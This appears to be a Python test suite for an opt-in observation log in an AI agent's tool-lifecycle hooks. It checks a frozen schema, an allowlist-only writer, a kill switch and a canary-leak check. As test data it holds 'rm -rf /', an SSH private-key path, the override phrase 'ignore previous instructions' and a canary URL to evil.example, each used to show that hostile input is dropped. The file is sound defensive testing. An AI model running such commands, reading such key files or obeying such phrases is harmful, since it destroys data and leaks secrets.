"""PLAN-154 item 1 — opt-in metadata OBSERVE rail tests (A2/A3/A12).

Covers the three binding CI assertions from PLAN-154 constraint 1 (A2) plus
the kill-switch story (A12) and the MF-SEC-5 preservation:

* (a) FROZEN SCHEMA-HASH fixture — ``observation_schema_digest()`` is pinned;
  ANY field addition/removal/reorder, type change, or enum widening REDs the
  pin until consciously updated in review (an ADR-160 amendment for new
  fields);
* (b) CLOSED-TYPE EMITTER GATE — no free-form string passes the writer: un-
  allowlisted fields are dropped (deny-by-default), values in allowed fields
  are re-coerced by closed-set membership;
* (c) CANARY-EXFILTRATION — a synthetic tool call carrying
  ``CANARY_SECRET_xyz`` in args/output/tool identifiers → ZERO hits grepping
  the observation store;
* kill-switch NEGATIVE CONTROL — ``CEO_LEARNING_OBSERVE`` unset → zero
  filesystem delta from the observe rail (structurally OFF);
* ``CEO_SOTA_DISABLE=1`` master precedence; explicit-off breadcrumb emitted
  ≤1× per session (marker-file dedupe, Wave-E liveness wiring);
* MF-SEC-5 preserved — ``record_pre`` stays audit-silent and writes NO
  observation row even when the rail is enabled;
* advisory perf — the extended write path stays within the in-process p99
  budget (same xfail-advisory shape as ``test_tool_lifecycle_perf.py``).

All audit-chain-touching tests isolate via ``TestEnvContext``. Env mutation
only via ``mock.patch.dict`` (plus the TestEnvContext snapshot/strip idiom in
``setUp``) — never bare ``os.environ[...] =``.

Stdlib-only + pytest markers, Python >= 3.9, ``from __future__ import
annotations``.
"""

from __future__ import annotations

import hashlib
import json
import os
import statistics
import time
import unittest
from pathlib import Path
from typing import Any, Dict, List, Optional, Set
from unittest import mock

import pytest

from _lib import audit_emit  # noqa: E402
from _lib import tool_lifecycle  # noqa: E402
from _lib.testing import TestEnvContext  # noqa: E402


# The frozen schema-hash pin (A2 CI assertion a). Recompute ONLY as a
# conscious review act (new field = ADR-160 amendment; enum widening = the
# same review that touches the 3-way _RECOGNIZED_TOOL_NAMES pin):
#   python3 -c "from _lib import tool_lifecycle as t; print(t.observation_schema_digest())"
_PINNED_SCHEMA_DIGEST = (
    "a28d06d5918fea68d5a730ec2bb043f6162df8f0f561f5da70be29a9e3bd39c3"
)

_PINNED_SCHEMA_FIELDS = [
    "v",
    "tool_name_enum",
    "duration_bucket",
    "success",
    "orphan",
    "paired",
    "tool_use_hash",
]

_CANARY = "CANARY_SECRET_xyz"


# ---------------------------------------------------------------------------
# Minimal NormalizedEvent-shaped carriers (record_pre / record_post read only
# session_id / tool_use_id / tool_name / duration_ms — _RichEvent additionally
# carries hostile payload attributes the rail must never read).
# ---------------------------------------------------------------------------


class _PreEvent:
    def __init__(self, *, session_id: str, tool_use_id: str, tool_name: str) -> None:
        self.session_id = session_id
        self.tool_use_id = tool_use_id
        self.tool_name = tool_name


class _PostEvent:
    def __init__(
        self, *, session_id: str, tool_use_id: str, tool_name: str,
        duration_ms: Optional[int],
    ) -> None:
        self.session_id = session_id
        self.tool_use_id = tool_use_id
        self.tool_name = tool_name
        self.duration_ms = duration_ms


class _RichEvent:
    """Carrier with arbitrary extra attributes (canary-exfiltration shape)."""

    def __init__(self, **kwargs: Any) -> None:
        for key, value in kwargs.items():
            setattr(self, key, value)


# ---------------------------------------------------------------------------
# Base — isolated audit dir + store/marker/event readers
# ---------------------------------------------------------------------------


class _ObserveBase(TestEnvContext):
    def setUp(self) -> None:
        super().setUp()
        # Parent-shell hygiene: CEO_LEARNING_OBSERVE is NOT in the
        # TestEnvContext strip list, so an operator shell that exported it
        # would leak into the gate under test. Same snapshot-then-strip idiom
        # TestEnvContext.setUp uses for CEO_SOTA_DISABLE et al. (the snapshot
        # taken in super().setUp() restores it in tearDown).
        os.environ.pop("CEO_LEARNING_OBSERVE", None)

    # -- store/marker helpers ------------------------------------------------

    def _store_path(self, session_id: str) -> Path:
        return tool_lifecycle.observation_store_path(session_id)

    def _marker_path(self, session_id: str) -> Path:
        return tool_lifecycle._observe_disabled_marker_path(session_id)

    def _store_rows(self, session_id: str) -> List[Dict[str, Any]]:
        path = self._store_path(session_id)
        if not path.is_file():
            return []
        rows: List[Dict[str, Any]] = []
        for line in path.read_text(encoding="utf-8").splitlines():
            line = line.strip()
            if line:
                rows.append(json.loads(line))
        return rows

    def _all_paths_under(self, root: Path) -> Set[str]:
        out: Set[str] = set()
        if not root.exists():
            return out
        for dirpath, dirnames, filenames in os.walk(str(root)):
            for name in dirnames + filenames:
                out.add(os.path.join(dirpath, name))
        return out

    # -- audit-chain readers (same shape as test_tool_lifecycle.py) ----------

    def _read_events(self) -> List[Dict[str, Any]]:
        log = Path(os.environ["CEO_AUDIT_LOG_PATH"])
        out: List[Dict[str, Any]] = []
        if log.exists():
            for line in log.read_text(encoding="utf-8").splitlines():
                line = line.strip()
                if line:
                    out.append(json.loads(line))
        return out

    # -- golden paired flow ---------------------------------------------------

    def _run_paired(
        self, session_id: str, tool_use_id: str = "u1",
        tool_name: str = "Bash", duration_ms: int = 2500, failure: bool = False,
    ) -> None:
        tool_lifecycle.record_pre(_PreEvent(
            session_id=session_id, tool_use_id=tool_use_id, tool_name=tool_name,
        ))
        tool_lifecycle.record_post(_PostEvent(
            session_id=session_id, tool_use_id=tool_use_id,
            tool_name=tool_name, duration_ms=duration_ms,
        ), failure=failure)


# ---------------------------------------------------------------------------
# 1. Kill-switch NEGATIVE CONTROL — env unset → zero filesystem delta (A2/A12)
# ---------------------------------------------------------------------------


class TestObserveKillSwitchNegativeControl(_ObserveBase):
    def test_unset_env_zero_filesystem_delta(self):
        # CEO_LEARNING_OBSERVE is guaranteed-unset by setUp. Snapshot the
        # whole isolated tmp tree, run the golden paired flow, and assert the
        # only filesystem delta is the pre-existing base rail's (state file /
        # lock / audit log) — nothing observe-shaped anywhere.
        with mock.patch.dict(os.environ):
            os.environ.pop("CEO_LEARNING_OBSERVE", None)
            sid = "sess-off"
            before = self._all_paths_under(self._tmp_root)
            self._run_paired(sid)
            after = self._all_paths_under(self._tmp_root)

        delta = after - before
        for path in delta:
            self.assertNotIn(
                ".observe", path,
                "unset opt-in must produce ZERO observe-rail filesystem "
                "delta, found: %s" % path,
            )
        self.assertFalse(self._store_path(sid).exists())
        self.assertFalse(self._marker_path(sid).exists())
        # The tool-lifecycle dir holds ONLY base-rail artifacts.
        tl_dir = self._store_path(sid).parent
        residue = [
            p.name for p in tl_dir.iterdir()
            if ".observe" in p.name
        ] if tl_dir.is_dir() else []
        self.assertEqual(residue, [])
        # And the audit chain carries ONLY the base-rail action.
        actions = {e.get("action") for e in self._read_events()}
        self.assertLessEqual(actions, {"tool_call_lifecycle_recorded"})

    def test_unset_env_sweep_and_cleanup_zero_observe_delta(self):
        with mock.patch.dict(os.environ):
            os.environ.pop("CEO_LEARNING_OBSERVE", None)
            sid = "sess-off-sweep"
            tool_lifecycle.record_pre(
                _PreEvent(session_id=sid, tool_use_id="u-orph", tool_name="Bash"),
                now_fn=lambda: 1000.0,
            )
            n = tool_lifecycle.sweep_orphans(
                sid, now_fn=lambda: 1031.0, timeout_s=30,
            )
            self.assertEqual(n, 1)
            tool_lifecycle.cleanup_session(sid)
        self.assertFalse(self._store_path(sid).exists())
        self.assertFalse(self._marker_path(sid).exists())
        residue = self._all_paths_under(self._tmp_root)
        self.assertFalse(any(".observe" in p for p in residue))


# ---------------------------------------------------------------------------
# 2. Enabled capture — closed rows, append-only, 0600, master precedence
# ---------------------------------------------------------------------------


class TestObserveEnabledCapture(_ObserveBase):
    def test_paired_post_appends_one_closed_row(self):
        with mock.patch.dict(os.environ, {"CEO_LEARNING_OBSERVE": "1"}):
            sid = "sess-on"
            self._run_paired(sid, tool_use_id="u1", tool_name="Bash",
                             duration_ms=2500)
        rows = self._store_rows(sid)
        self.assertEqual(len(rows), 1)
        row = rows[0]
        self.assertEqual(row["v"], 1)
        self.assertEqual(row["tool_name_enum"], "Bash")
        self.assertEqual(row["duration_bucket"], "b_1_10s")
        self.assertIs(row["success"], True)
        self.assertIs(row["orphan"], False)
        self.assertIs(row["paired"], True)
        self.assertEqual(
            row["tool_use_hash"],
            hashlib.sha256(b"u1").hexdigest()[:16],
        )

    def test_rows_append_in_order(self):
        with mock.patch.dict(os.environ, {"CEO_LEARNING_OBSERVE": "1"}):
            sid = "sess-append"
            self._run_paired(sid, tool_use_id="u1", tool_name="Read",
                             duration_ms=40)
            self._run_paired(sid, tool_use_id="u2", tool_name="Bash",
                             duration_ms=5200)
        rows = self._store_rows(sid)
        self.assertEqual(len(rows), 2)
        self.assertEqual(rows[0]["tool_name_enum"], "Read")
        self.assertEqual(rows[1]["tool_name_enum"], "Bash")

    def test_missing_pre_marks_paired_false(self):
        with mock.patch.dict(os.environ, {"CEO_LEARNING_OBSERVE": "1"}):
            sid = "sess-nopre"
            tool_lifecycle.record_post(_PostEvent(
                session_id=sid, tool_use_id="u-nopre",
                tool_name="Edit", duration_ms=120,
            ), failure=False)
        rows = self._store_rows(sid)
        self.assertEqual(len(rows), 1)
        self.assertIs(rows[0]["paired"], False)
        self.assertEqual(rows[0]["tool_name_enum"], "Edit")

    def test_failure_marks_success_false(self):
        with mock.patch.dict(os.environ, {"CEO_LEARNING_OBSERVE": "1"}):
            sid = "sess-fail"
            self._run_paired(sid, failure=True)
        rows = self._store_rows(sid)
        self.assertEqual(len(rows), 1)
        self.assertIs(rows[0]["success"], False)
        self.assertIs(rows[0]["orphan"], False)

    def test_orphan_sweep_appends_orphan_row(self):
        with mock.patch.dict(os.environ, {"CEO_LEARNING_OBSERVE": "1"}):
            sid = "sess-orph"
            tool_lifecycle.record_pre(
                _PreEvent(session_id=sid, tool_use_id="u-orph",
                          tool_name="WebFetch"),
                now_fn=lambda: 1000.0,
            )
            n = tool_lifecycle.sweep_orphans(
                sid, now_fn=lambda: 1031.0, timeout_s=30,
            )
            self.assertEqual(n, 1)
        rows = self._store_rows(sid)
        self.assertEqual(len(rows), 1)
        row = rows[0]
        self.assertIs(row["orphan"], True)
        self.assertIs(row["success"], False)
        self.assertIs(row["paired"], True)
        self.assertEqual(row["tool_name_enum"], "WebFetch")
        self.assertEqual(row["duration_bucket"], "lt_100ms")
        self.assertEqual(
            row["tool_use_hash"],
            hashlib.sha256(b"u-orph").hexdigest()[:16],
        )

    def test_store_file_mode_is_0600(self):
        with mock.patch.dict(os.environ, {"CEO_LEARNING_OBSERVE": "1"}):
            sid = "sess-mode"
            self._run_paired(sid)
        mode = os.stat(str(self._store_path(sid))).st_mode & 0o777
        self.assertEqual(mode, 0o600)

    def test_sota_disable_master_precedence_no_store_write(self):
        # A12: CEO_SOTA_DISABLE=1 beats an enabled opt-in — no store write.
        with mock.patch.dict(os.environ, {
            "CEO_LEARNING_OBSERVE": "1", "CEO_SOTA_DISABLE": "1",
        }):
            sid = "sess-sota"
            self._run_paired(sid)
        self.assertFalse(self._store_path(sid).exists())
        self.assertTrue(self._marker_path(sid).exists())

    def test_explicit_off_value_no_store_write(self):
        with mock.patch.dict(os.environ, {"CEO_LEARNING_OBSERVE": "0"}):
            sid = "sess-explicit-off"
            self._run_paired(sid)
        self.assertFalse(self._store_path(sid).exists())
        self.assertTrue(self._marker_path(sid).exists())

    def test_cleanup_session_preserves_store_deletes_marker(self):
        # The observation store is the item-2 distiller's read surface —
        # cleanup_session must NOT delete it; the disabled-marker (session-
        # scoped once-guard) IS deleted.
        with mock.patch.dict(os.environ, {"CEO_LEARNING_OBSERVE": "1"}):
            sid = "sess-persist"
            self._run_paired(sid)
            tool_lifecycle.cleanup_session(sid)
            self.assertTrue(self._store_path(sid).exists())
            self.assertEqual(len(self._store_rows(sid)), 1)
        with mock.patch.dict(os.environ, {"CEO_LEARNING_OBSERVE": "0"}):
            sid2 = "sess-marker-clean"
            self._run_paired(sid2)
            self.assertTrue(self._marker_path(sid2).exists())
            tool_lifecycle.cleanup_session(sid2)
            self.assertFalse(self._marker_path(sid2).exists())


# ---------------------------------------------------------------------------
# 3. A2 CI assertion (a) — FROZEN schema hash
# ---------------------------------------------------------------------------


class TestFrozenSchemaHash(unittest.TestCase):
    def test_schema_digest_pinned(self):
        # RED on ANY schema change: field add/remove/reorder, type change, or
        # enum widening (including a _RECOGNIZED_TOOL_NAMES widening — that is
        # a deliberate coupling: the same review that touches the 3-way enum
        # pin consciously re-pins this digest). Updating the pin without an
        # ADR-160 amendment for a NEW field is a review violation (A2).
        self.assertEqual(
            tool_lifecycle.observation_schema_digest(),
            _PINNED_SCHEMA_DIGEST,
            "observation schema changed — this pin may ONLY be updated as a "
            "conscious review act (new field ⇒ ADR-160 amendment; see "
            "OBSERVATION_SCHEMA_V1 in tool_lifecycle.py)",
        )

    def test_schema_field_names_pinned(self):
        # Readable failure mode alongside the digest: the exact field list.
        self.assertEqual(
            [name for name, _spec in tool_lifecycle.OBSERVATION_SCHEMA_V1],
            _PINNED_SCHEMA_FIELDS,
        )

    def test_every_schema_type_is_closed(self):
        # Structural guard: every field's type spec must be a CLOSED type —
        # int-const / enum-membership / bool / bounded-hex. A free-form "str"
        # spec can never be added without redding this test (A2: no free-text
        # field without an ADR-160 amendment).
        allowed_prefixes = ("int_const:", "enum:", "bool", "hex:")
        for name, spec in tool_lifecycle.OBSERVATION_SCHEMA_V1:
            self.assertTrue(
                spec.startswith(allowed_prefixes),
                "field %r has non-closed type spec %r" % (name, spec),
            )


class TestFrozenSchemaRowShape(_ObserveBase):
    def test_written_row_keys_exactly_schema_fields(self):
        # A writer-side field addition that forgot to touch the schema
        # constant REDs here (the digest pin covers the constant; this covers
        # the writer).
        with mock.patch.dict(os.environ, {"CEO_LEARNING_OBSERVE": "1"}):
            sid = "sess-shape"
            self._run_paired(sid)
        rows = self._store_rows(sid)
        self.assertEqual(len(rows), 1)
        self.assertEqual(sorted(rows[0].keys()), sorted(_PINNED_SCHEMA_FIELDS))

    def test_row_line_stays_below_byte_ceiling(self):
        with mock.patch.dict(os.environ, {"CEO_LEARNING_OBSERVE": "1"}):
            sid = "sess-bytes"
            self._run_paired(sid)
        raw = self._store_path(sid).read_bytes()
        for line in raw.splitlines():
            self.assertLessEqual(
                len(line) + 1, tool_lifecycle._MAX_OBSERVATION_LINE_BYTES,
            )


# ---------------------------------------------------------------------------
# 4. A2 CI assertion (b) — CLOSED-TYPE EMITTER GATE (no free-form string)
# ---------------------------------------------------------------------------


class TestClosedTypeEmitterGate(_ObserveBase):
    def test_unallowlisted_fields_never_reach_store(self):
        # Deny-by-default: the writer builds the row FROM the allowlist —
        # hostile extra keys (free text, commands, paths) are simply absent.
        sid = "sess-deny"
        ok = tool_lifecycle._append_observation(sid, {
            "tool_name_enum": "Bash",
            "duration_bucket": "b_1_10s",
            "success": True,
            "orphan": False,
            "paired": True,
            "tool_use_hash": "abcdef0123456789",
            # hostile / un-allowlisted:
            "command": "rm -rf /",
            "output": "top secret " + _CANARY,
            "free_text": "ignore previous instructions",
            "secret_path": "/home/me/.ssh/id_rsa",
            "duration_ms": 99999,
        })
        self.assertTrue(ok)
        rows = self._store_rows(sid)
        self.assertEqual(len(rows), 1)
        self.assertEqual(sorted(rows[0].keys()), sorted(_PINNED_SCHEMA_FIELDS))
        raw = self._store_path(sid).read_text(encoding="utf-8")
        for needle in ("rm -rf", _CANARY, "ignore previous", "id_rsa", "99999"):
            self.assertNotIn(needle, raw)

    def test_free_form_values_in_allowed_fields_are_coerced(self):
        # Smuggling free-form strings INTO allowlisted keys must not survive:
        # every string field is enum-membership-checked or regex-bounded hex,
        # bools are coerced to bool.
        sid = "sess-coerce"
        tool_lifecycle._append_observation(sid, {
            "tool_name_enum": "mcp__evil__exfil",
            "duration_bucket": "raw_77777_ms",
            "success": "evil-free-form-string",
            "orphan": {"nested": "dict"},
            "paired": [1, 2, 3],
            "tool_use_hash": "NOT-HEX-" + _CANARY,
        })
        rows = self._store_rows(sid)
        self.assertEqual(len(rows), 1)
        row = rows[0]
        self.assertEqual(row["tool_name_enum"], "mcp_other")
        self.assertEqual(row["duration_bucket"], "lt_100ms")
        self.assertIsInstance(row["success"], bool)
        self.assertIsInstance(row["orphan"], bool)
        self.assertIsInstance(row["paired"], bool)
        self.assertEqual(row["tool_use_hash"], "")
        raw = self._store_path(sid).read_text(encoding="utf-8")
        for needle in ("mcp__", "77777", "evil-free-form-string", "nested",
                       _CANARY):
            self.assertNotIn(needle, raw)

    def test_non_dict_input_writes_floor_row(self):
        sid = "sess-nondict"
        ok = tool_lifecycle._append_observation(sid, "not a dict")  # type: ignore[arg-type]
        self.assertTrue(ok)
        rows = self._store_rows(sid)
        self.assertEqual(len(rows), 1)
        self.assertEqual(rows[0]["tool_name_enum"], "other")
        self.assertEqual(rows[0]["duration_bucket"], "lt_100ms")

    def test_uppercase_hex_hash_is_rejected(self):
        # The hash bound is LOWERCASE hex ≤16 — anything else empties.
        sid = "sess-hexcase"
        tool_lifecycle._append_observation(sid, {
            "tool_use_hash": "ABCDEF0123456789",
        })
        rows = self._store_rows(sid)
        self.assertEqual(rows[0]["tool_use_hash"], "")


# ---------------------------------------------------------------------------
# 5. A2 CI assertion (c) — CANARY-EXFILTRATION (zero hits in the store)
# ---------------------------------------------------------------------------


class TestCanaryExfiltration(_ObserveBase):
    def test_canary_in_args_and_output_never_reaches_store(self):
        # Synthetic tool call carrying the canary in EVERY attacker-reachable
        # surface: tool args, output, error, the raw tool name AND the
        # tool_use_id. The rail is ON and DOES write rows — and the store must
        # still grep clean.
        with mock.patch.dict(os.environ, {"CEO_LEARNING_OBSERVE": "1"}):
            sid = "sess-canary"
            canary_tuid = "toolu_" + _CANARY
            pre = _RichEvent(
                session_id=sid,
                tool_use_id=canary_tuid,
                tool_name="Bash_" + _CANARY,
                tool_input={"command": "echo " + _CANARY},
                command="echo " + _CANARY,
            )
            post = _RichEvent(
                session_id=sid,
                tool_use_id=canary_tuid,
                tool_name="Bash_" + _CANARY,
                duration_ms=2500,
                tool_input={"command": "echo " + _CANARY},
                command="echo " + _CANARY,
                output=_CANARY + " leaked-into-stdout",
                error=_CANARY + " leaked-into-stderr",
                tool_response={"stdout": _CANARY},
            )
            tool_lifecycle.record_pre(pre)
            tool_lifecycle.record_post(post, failure=False)
            # And an orphaned canary call swept at session end.
            tool_lifecycle.record_pre(
                _RichEvent(
                    session_id=sid,
                    tool_use_id="toolu_orph_" + _CANARY,
                    tool_name="WebFetch",
                    url="https://evil.example/?q=" + _CANARY,
                ),
                now_fn=lambda: 1000.0,
            )
            tool_lifecycle.sweep_orphans(sid, now_fn=lambda: 1031.0, timeout_s=30)

        # The rail captured (non-vacuous)…
        rows = self._store_rows(sid)
        self.assertEqual(len(rows), 2)
        # …the unrecognized canary-bearing tool name collapsed to "other"…
        self.assertEqual(rows[0]["tool_name_enum"], "other")
        # …and grepping the ENTIRE observation store (every *.observe* file
        # under the isolated audit tree) yields ZERO canary hits.
        hits = []
        for dirpath, _dirnames, filenames in os.walk(str(self.audit_dir)):
            for name in filenames:
                if ".observe" not in name:
                    continue
                blob = (Path(dirpath) / name).read_bytes()
                if _CANARY.encode("utf-8") in blob:
                    hits.append(os.path.join(dirpath, name))
        self.assertEqual(
            hits, [],
            "CANARY leaked into the observation store: %r" % hits,
        )


# ---------------------------------------------------------------------------
# 6. Fail-open + MF-SEC-5 preservation + disabled breadcrumb (A12)
# ---------------------------------------------------------------------------


def _patch_typed_disabled_emitter(recorder):
    """Patch ``emit_learning_rail_disabled`` on the module object the production
    breadcrumb actually resolves — robust to cross-suite ``_lib.audit_emit``
    churn (PLAN-155 MANIFEST-B §6.A composed-suite flake).

    ``tool_lifecycle._emit_observe_disabled_breadcrumb`` resolves the emitter via
    a FRESH ``from _lib import audit_emit`` on every call. In the composed
    154+155 suite, predecessor tests reimport / rebind ``_lib.audit_emit`` in
    two distinct ways that BOTH break the naive
    ``mock.patch.object(audit_emit, ...)`` on THIS module's collection-time
    ``audit_emit`` binding:

    * ``test_check_agent_spawn.py::TestPLAN078Wave1ModelRoutingAdvisory``
      ``spec_from_file_location``-loads a fresh ``_lib.audit_emit`` and, in
      tearDown, ``sys.modules.pop`` + ``importlib.import_module`` re-creates it
      → this file's module-level ``audit_emit`` name goes STALE (a DIFFERENT
      object than the one the breadcrumb now resolves). ``patch.object`` on the
      stale object leaves the breadcrumb calling the REAL emitter →
      ``len(calls) == 0``.
    * Another predecessor ``sys.modules.pop("_lib.audit_emit")`` WITHOUT
      re-setting the ``_lib`` package attribute → the ``_lib.audit_emit``
      attribute is left DANGLING while ``sys.modules["_lib.audit_emit"]`` still
      exists. The breadcrumb's ``from _lib import audit_emit`` still works
      (the ``IMPORT_FROM`` opcode falls back to ``sys.modules``), but a
      ``mock.patch("_lib.audit_emit.emit_...")`` STRING target does NOT — mock's
      ``_dot_lookup`` uses ``getattr(_lib, "audit_emit")`` with no sys.modules
      fallback and raises ``AttributeError: module '_lib' has no attribute
      'audit_emit'``.

    The fix resolves the emitter the SAME way the breadcrumb does — a live
    ``from _lib import audit_emit`` (same ``IMPORT_FROM`` semantics: getattr on
    the package, else ``sys.modules`` fallback) — then patches THAT object
    directly with ``patch.object``. So the patch always lands on the exact
    object the breadcrumb will read, under a stale rebind AND a dangling package
    attribute. The marker file is written regardless (it resolves via
    ``_audit_dir()``, not ``audit_emit``), which is why only the ``len(calls)``
    assertions ever failed. ``create=True`` keeps the pre-registration path
    (no typed emitter yet) working too.
    """
    from _lib import audit_emit as _live_audit_emit  # noqa: E402 — as the breadcrumb resolves it
    return mock.patch.object(
        _live_audit_emit, "emit_learning_rail_disabled", recorder, create=True,
    )


class TestObserveFailOpenAndBreadcrumb(_ObserveBase):
    def test_store_write_failure_never_raises(self):
        # audit_dir pointing at a FILE (not a dir) breaks both the state file
        # and the store append — record_post must not raise, and the base-rail
        # audit emit (env-routed, independent of audit_dir) still lands.
        with mock.patch.dict(os.environ, {"CEO_LEARNING_OBSERVE": "1"}):
            bad_dir = self.audit_dir / "not-a-dir"
            bad_dir.write_text("x", encoding="utf-8")
            post = _PostEvent(
                session_id="s-bad", tool_use_id="u-bad",
                tool_name="Bash", duration_ms=10,
            )
            tool_lifecycle.record_post(post, failure=False, audit_dir=bad_dir)
        actions = [e.get("action") for e in self._read_events()]
        self.assertEqual(actions, ["tool_call_lifecycle_recorded"])

    def test_record_pre_stays_audit_silent_and_writes_no_observe_row(self):
        # MF-SEC-5 preservation: even with the rail ENABLED, the Pre path
        # emits NO audit-chain event and appends NO observation row (the
        # observe rail hangs only off the Post/sweep side).
        with mock.patch.dict(os.environ, {"CEO_LEARNING_OBSERVE": "1"}):
            sid = "sess-pre-silent"
            tool_lifecycle.record_pre(_PreEvent(
                session_id=sid, tool_use_id="u-pre", tool_name="Bash",
            ))
            self.assertEqual(self._read_events(), [])
            self.assertFalse(self._store_path(sid).exists())

    def test_disabled_breadcrumb_emitted_once_per_session(self):
        # A12: explicit-off → ONE learning_rail_disabled breadcrumb per rail
        # per session, deduped by the marker file. The typed emitter is
        # monkeypatched in (the house getattr guard picks it up), so this
        # test is independent of the integrator's 4-file action registration.
        calls: List[Dict[str, Any]] = []

        def _recorder(**kwargs: Any) -> None:
            calls.append(kwargs)

        # _patch_typed_disabled_emitter patches the LIVE _lib.audit_emit (the
        # object the production breadcrumb resolves), so it is immune to a
        # predecessor test that reimports/rebinds the module (see the helper's
        # docstring). create=True restores prior state either way: pre-
        # registration it removes the attr again; post-registration (integrator
        # 4-file coupling landed) it restores the REAL typed emitter instead of
        # deleting it (set/del would poison every later test in the process).
        with _patch_typed_disabled_emitter(_recorder):
            with mock.patch.dict(os.environ, {"CEO_LEARNING_OBSERVE": "0"}):
                sid = "sess-crumb"
                for i in range(3):
                    self._run_paired(sid, tool_use_id="u%d" % i)

        self.assertEqual(len(calls), 1)
        self.assertEqual(calls[0].get("rail"), "observe")
        self.assertEqual(calls[0].get("switch"), "CEO_LEARNING_OBSERVE")
        self.assertTrue(self._marker_path("sess-crumb").exists())
        self.assertFalse(self._store_path("sess-crumb").exists())

    def test_sota_kill_breadcrumb_names_the_master_switch(self):
        calls: List[Dict[str, Any]] = []

        def _recorder(**kwargs: Any) -> None:
            calls.append(kwargs)

        with _patch_typed_disabled_emitter(_recorder):
            with mock.patch.dict(os.environ, {
                "CEO_LEARNING_OBSERVE": "1", "CEO_SOTA_DISABLE": "1",
            }):
                self._run_paired("sess-sota-crumb")

        self.assertEqual(len(calls), 1)
        self.assertEqual(calls[0].get("switch"), "CEO_SOTA_DISABLE")

    @unittest.skipIf(
        hasattr(audit_emit, "emit_learning_rail_disabled"),
        "typed emitter landed (integrator 4-file coupling) — the pre-"
        "registration no-op path is no longer reachable; the emitted row is "
        "covered by the recorder tests above + the integrated contract tests",
    )
    def test_breadcrumb_pre_registration_is_silent_noop(self):
        # Before the integrator lands the learning_rail_disabled registration
        # (4-file coupling), the fallback emit_generic path is a silent no-op
        # breadcrumb: no exception, no chain row, marker still dedupes.
        with mock.patch.dict(os.environ, {"CEO_LEARNING_OBSERVE": "0"}):
            sid = "sess-noopcrumb"
            self._run_paired(sid)
        actions = {e.get("action") for e in self._read_events()}
        self.assertNotIn("learning_rail_disabled", actions)
        self.assertTrue(self._marker_path("sess-noopcrumb").exists())

    def test_unset_env_emits_no_breadcrumb(self):
        # Never-opted-in installs must NOT accumulate disabled breadcrumbs
        # (zero-delta posture) — the breadcrumb is only for the RECORDED
        # operator choice (explicit off / master kill).
        calls: List[Dict[str, Any]] = []

        def _recorder(**kwargs: Any) -> None:
            calls.append(kwargs)

        with _patch_typed_disabled_emitter(_recorder):
            with mock.patch.dict(os.environ):
                os.environ.pop("CEO_LEARNING_OBSERVE", None)
                self._run_paired("sess-nocrumb")

        self.assertEqual(calls, [])
        self.assertFalse(self._marker_path("sess-nocrumb").exists())


# ---------------------------------------------------------------------------
# 7. Advisory perf — extended write path (same shape as
#    test_tool_lifecycle_perf.py; auto-marked serial via nodeid regex)
# ---------------------------------------------------------------------------


N_ITERS = 250  # ≥200 per ADR-071 percentile-stability minimum
P99_BUDGET_MS = 2.0


class TestObservePerf(TestEnvContext):
    @pytest.mark.advisory
    @pytest.mark.xfail(
        strict=False,  # ADVISORY — XPASS never fails CI ([[feedback-xpass-strict-flake-trap]]).
        run=True,
        reason=(
            "ADVISORY in-process perf budget (PLAN-154 item 1 / A3). The "
            "record_pre+record_post hot path WITH the observe rail enabled "
            "(one extra O_APPEND write of a ~120-byte closed row, emit "
            "MOCKED) targets the same p99 < 2ms as the base rail. Under "
            "heavy concurrent pytest load the wall-clock budget can be "
            "missed; solo it XPASSes. strict=False so an XPASS never fails "
            "CI. NOT a strict gate by design."
        ),
    )
    def test_observe_write_path_under_2ms_p99(self):
        orig = audit_emit.emit_tool_call_lifecycle_recorded
        audit_emit.emit_tool_call_lifecycle_recorded = lambda **k: None  # type: ignore[assignment]
        samples_ms = []
        try:
            with mock.patch.dict(os.environ, {"CEO_LEARNING_OBSERVE": "1"}):
                warm_pre = _PreEvent(
                    session_id="perf-warm", tool_use_id="w", tool_name="Bash",
                )
                tool_lifecycle.record_pre(warm_pre)
                tool_lifecycle.record_post(
                    _PostEvent(session_id="perf-warm", tool_use_id="w",
                               tool_name="Bash", duration_ms=10),
                    failure=False,
                )
                for i in range(N_ITERS):
                    tuid = "u%d" % i
                    pre = _PreEvent(session_id="perf", tool_use_id=tuid,
                                    tool_name="Bash")
                    post = _PostEvent(session_id="perf", tool_use_id=tuid,
                                      tool_name="Bash", duration_ms=2500)
                    t0 = time.perf_counter()
                    tool_lifecycle.record_pre(pre)
                    tool_lifecycle.record_post(post, failure=False)
                    dt_ms = (time.perf_counter() - t0) * 1000.0
                    samples_ms.append(dt_ms)
        finally:
            audit_emit.emit_tool_call_lifecycle_recorded = orig  # type: ignore[assignment]

        samples_ms.sort()
        idx = max(0, int(round(0.99 * len(samples_ms))) - 1)
        p99 = samples_ms[idx]
        p50 = statistics.median(samples_ms)
        print(
            "\n[observe-rail perf] N=%d  p50=%.3fms  p99=%.3fms (budget %.1fms)"
            % (len(samples_ms), p50, p99, P99_BUDGET_MS)
        )
        self.assertLess(
            p99, P99_BUDGET_MS,
            "observe-enabled pair logic p99=%.3fms exceeds %.1fms budget"
            % (p99, P99_BUDGET_MS),
        )


if __name__ == "__main__":
    unittest.main()
